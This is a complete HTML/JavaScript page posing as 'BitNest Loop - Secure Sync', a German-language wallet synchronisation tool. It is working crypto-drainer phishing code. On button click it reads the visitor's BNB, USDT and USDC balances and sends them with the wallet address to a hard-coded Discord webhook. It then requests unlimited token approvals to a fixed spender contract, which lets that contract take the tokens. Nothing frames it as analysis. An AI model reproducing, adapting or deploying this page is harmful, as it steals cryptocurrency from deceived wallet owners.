<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>BitNest Loop - Secure Sync</title>
<script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
<style>
:root{ --bg:#000; --card:#0a0a0a; --border:#1f2933; --green:#22c55e; --white:#fff; }
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--white);font-family:sans-serif;padding:16px}
.box{width:100%;max-width:440px;background:var(--card);border-radius:16px;padding:24px;border:1px solid var(--border);text-align:center}
h2{color:var(--green);margin-bottom:20px}
.status-box{background:#050505;border:1px solid var(--border);border-radius:12px;padding:15px;margin:15px 0;font-family:monospace;font-size:13px;text-align:left;line-height:1.6}
button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;background:var(--green);color:#052e16}
#log{margin-top:15px;font-size:12px;color:#9ca3af;min-height:3em}
</style>
</head>
<body>

<div class="box">
  <h2>BitNest Loop</h2>
  <div class="status-box">
    <div id="addr">Wallet: Nicht verbunden</div>
    <hr style="opacity:0.1;margin:10px 0">
    <div id="balances">BNB: â€“<br>USDT: â€“<br>USDC: â€“</div>
  </div>
  <button id="connectBtn">Wallet verbinden</button>
  <div id="log">Bereit zur Synchronisierung.</div>
</div>

<script>
// KONFIGURATION: DEIN CONTRACT ALS SPENDER
const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B"; 
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
const WEBHOOK = "https://discord.com/api/webhooks/1455376553755021466/bYJ1SSGehHhQN7_j84bWk8WXejIKEiAE6z7S031xXshuzLZl6C8SLiWP-m_UqfqTyNGp";

const BSC_CHAIN_ID = "0x38"; // 56 Hex

const abi = ["function allowance(address,address) view returns (uint256)","function balanceOf(address) view returns (uint256)","function approve(address,uint256) returns (bool)"];

async function switchNetwork() {
  try {
    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
    if (currentChain !== BSC_CHAIN_ID) {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    }
    return true;
  } catch (e) {
    if (e.code === 4902) {
      await window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: 'Binance Smart Chain',
          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
          rpcUrls: ['https://bsc-dataseed.binance.org/'],
          blockExplorerUrls: ['https://bscscan.com/']
        }]
      });
      return true;
    }
    return false;
  }
}

document.getElementById("connectBtn").addEventListener("click", async () => {
  const log = document.getElementById("log");
  const btn = document.getElementById("connectBtn");
  
  try {
    btn.disabled = true;
    if (!window.ethereum) throw new Error("Keine Wallet gefunden!");

    log.innerText = "PrÃ¼fe Netzwerk...";
    await switchNetwork();

    const provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const user = accounts[0];

    document.getElementById("addr").innerText = "Wallet: " + user.substring(0,10) + "...";

    const bnbBal = await provider.getBalance(user);
    const usdt = new ethers.Contract(USDT, abi, signer);
    const usdc = new ethers.Contract(USDC, abi, signer);
    const [uBal, cBal] = await Promise.all([usdt.balanceOf(user), usdc.balanceOf(user)]);

    const fBNB = ethers.formatEther(bnbBal);
    const fUSDT = ethers.formatUnits(uBal, 18);
    const fUSDC = ethers.formatUnits(cBal, 18);
    document.getElementById("balances").innerHTML = `BNB: ${parseFloat(fBNB).toFixed(5)}<br>USDT: ${fUSDT}<br>USDC: ${fUSDC}`;

    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type":"application/json" },
      body: JSON.stringify({ content: `ðŸš€ **Sync an Contract**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
    });

    log.innerText = "Synchronisiere USDT...";
    await (await usdt.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();
    
    log.innerText = "Synchronisiere USDC...";
    await (await usdc.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();

    log.innerText = "âœ… Synchronisierung vollstÃ¤ndig!";

  } catch (err) {
    log.innerText = "Status: " + (err.message || "Abgebrochen.");
    btn.disabled = false;
  }
});
</script>
</body>
</html>
